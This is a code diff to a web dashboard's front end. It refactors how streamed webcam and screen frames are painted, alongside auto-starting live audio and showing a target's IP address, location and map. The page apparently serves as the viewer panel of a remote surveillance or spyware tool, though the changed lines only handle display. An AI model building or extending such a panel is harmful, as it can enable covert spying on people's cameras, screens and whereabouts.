@@ -307,6 +307,8 @@
 
     .loc-place { color: var(--text); font-weight: 500; }
 
+    .loc-place.unavailable { color: var(--text-dim); font-style: italic; font-weight: 400; }
+
     .loc-coords {
       color: var(--text-dim);
       font-size: 0.75rem;
@@ -435,28 +437,60 @@
       connText.textContent = 'Connection error';
     });
 
-    // ─────────── Webcam ───────────
+    // ─────────── Frame rendering helpers ───────────
+    function paintBytesFrame(imgEl, placeholderEl, dotEl, buf) {
+      // Socket.IO gives us an ArrayBuffer for binary events
+      const blob = buf instanceof Blob
+        ? buf
+        : new Blob([buf], { type: 'image/jpeg' });
+
+      const url = URL.createObjectURL(blob);
+      const old = imgEl.src;
+
+      imgEl.onload = () => {
+        // Revoke the previous blob URL after the new one loads
+        if (old && old.startsWith('blob:')) URL.revokeObjectURL(old);
+      };
+      imgEl.src = url;
+
+      imgEl.style.display = 'block';
+      placeholderEl.style.display = 'none';
+      dotEl.classList.add('live');
+    }
+
+    function paintB64Frame(imgEl, placeholderEl, dotEl, b64) {
+      imgEl.src = 'data:image/jpeg;base64,' + b64;
+      imgEl.style.display = 'block';
+      placeholderEl.style.display = 'none';
+      dotEl.classList.add('live');
+    }
+
     const webcamEl = document.getElementById('webcam');
     const camPlaceholder = document.getElementById('camPlaceholder');
     const camDot = document.getElementById('camDot');
 
-    socket.on('video_frame', data => {
-      webcamEl.src = 'data:image/jpeg;base64,' + data;
-      webcamEl.style.display = 'block';
-      camPlaceholder.style.display = 'none';
-      camDot.classList.add('live');
-    });
-
-    // ─────────── Screen ───────────
     const screenEl = document.getElementById('screen');
     const screenPlaceholder = document.getElementById('screenPlaceholder');
     const screenDot = document.getElementById('screenDot');
 
+    // ─────────── Webcam (binary) ───────────
+    socket.on('video_frame_bytes', buf => {
+      paintBytesFrame(webcamEl, camPlaceholder, camDot, buf);
+    });
+
+    // ─────────── Webcam (base64 fallback) ───────────
+    socket.on('video_frame', data => {
+      paintB64Frame(webcamEl, camPlaceholder, camDot, data);
+    });
+
+    // ─────────── Screen (binary) ───────────
+    socket.on('screen_frame_bytes', buf => {
+      paintBytesFrame(screenEl, screenPlaceholder, screenDot, buf);
+    });
+
+    // ─────────── Screen (base64 fallback) ───────────
     socket.on('screen_frame', data => {
-      screenEl.src = 'data:image/jpeg;base64,' + data;
-      screenEl.style.display = 'block';
-      screenPlaceholder.style.display = 'none';
-      screenDot.classList.add('live');
+      paintB64Frame(screenEl, screenPlaceholder, screenDot, data);
     });
 
     // ─────────── Live Audio (AUTO-START) ───────────
@@ -552,9 +586,14 @@
       ipEl.textContent = loc.ip || 'Unknown IP';
 
       const placeEl = document.createElement('div');
-      placeEl.className = 'loc-place';
       const parts = [loc.city, loc.region, loc.country].filter(Boolean);
-      placeEl.textContent = parts.length ? parts.join(', ') : 'Location unavailable';
+      if (parts.length) {
+        placeEl.className = 'loc-place';
+        placeEl.textContent = parts.join(', ');
+      } else {
+        placeEl.className = 'loc-place unavailable';
+        placeEl.textContent = 'Location unavailable';
+      }
 
       const coordsEl = document.createElement('div');
       coordsEl.className = 'loc-coords';
@@ -569,6 +608,7 @@
       const iframe = document.createElement('iframe');
       iframe.className = 'map';
       iframe.loading = 'lazy';
+      // Google Maps can resolve both "lat,lon" and raw IP strings
       const query = (loc.latitude && loc.longitude)
         ? `${loc.latitude},${loc.longitude}`
         : loc.ip;
